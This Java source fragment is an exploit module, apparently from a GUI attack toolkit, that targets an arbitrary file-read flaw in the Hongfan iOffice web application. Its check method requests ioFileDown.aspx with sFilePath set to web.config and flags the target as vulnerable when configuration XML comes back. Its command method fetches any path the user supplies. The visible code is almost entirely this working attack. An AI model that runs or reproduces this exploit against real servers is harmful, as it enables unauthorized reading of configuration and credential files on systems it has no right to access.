...
public class hongfan_ioFileDown_FileRead implements Exploitlnterface {
    @Override
...
//        return null;
    ...
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            ...
            Response get_res = HttpTools.get(url + "/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("<configuration>")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongfan_ioFileDown_FileRead ]");
                    textArea.appendText("\n 漏洞页面: "+url + "/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config");
    ...
    private Boolean attcmd(String url, String pwd, TextArea textArea, TextArea textArea_cmd) {
        try {
            ...
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String fullUrl = url + "/ioffice/prg/interface/ioFileDown.aspx?sFilePath="+pwd;
